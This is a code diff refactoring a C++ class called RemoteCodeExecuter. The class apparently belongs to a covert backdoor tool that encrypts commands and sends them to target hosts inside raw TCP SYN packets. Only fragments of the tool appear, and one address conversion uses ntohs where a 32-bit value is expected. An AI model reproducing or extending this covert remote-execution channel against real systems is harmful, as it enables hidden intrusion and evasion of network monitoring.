@@ -9,16 +9,8 @@
 #include "TcpStack.h"
 #include "authenticator.h"
 
-static const char *CMD_START_STR = "s-start[";
-static const char *CMD_STOP_STR = "]s-end";
-static const char *DATA_START_STR = "d-start[";
-static const char *DATA_STOP_STR = "]d-end";
-
-RemoteCodeExecuter::RemoteCodeExecuter(NetworkEngine *networkEngine) : net(networkEngine) {
-    this->net->LoopCallbacks.push_back(RemoteCodeExecuter::netCallback);
-}
-
-int RemoteCodeExecuter::sendCommand(const struct in_addr daddr, const std::string &cmd) {
+int RemoteCodeExecuter::sendCommand(NetworkEngine *net, const struct in_addr daddr,
+                                    const std::string &cmd) {
     unsigned short sport;
     unsigned short dport;
 
@@ -34,10 +26,10 @@ int RemoteCodeExecuter::sendCommand(const struct in_addr daddr, const std::strin
     UCharVector payload(data.begin(), data.end());
 
     // encrypt
-    UCharVector ciphertext = this->net->getCrypto()->enc(payload);
+    UCharVector ciphertext = net->getCrypto()->enc(payload);
 
     // send
-    return this->net->sendRawTcp(*this->net->getIp(), daddr, sport, dport, TcpStack::SYN_FLAG,
+    return net->sendRawTcp(*net->getIp(), daddr, sport, dport, TcpStack::SYN_FLAG,
                                  ciphertext);
 }
 
@@ -123,7 +115,8 @@ char *RemoteCodeExecuter::getResponse(char *payload) {
     return res;
 }
 
-static void executeCommand(NetworkEngine *net, const unsigned int daddr, const char *cmd) {
+void RemoteCodeExecuter::executeCommand(NetworkEngine *net, const unsigned int daddr,
+                                        const char *cmd) {
     struct in_addr daddrIn;
     daddrIn.s_addr = ntohs(daddr);
 
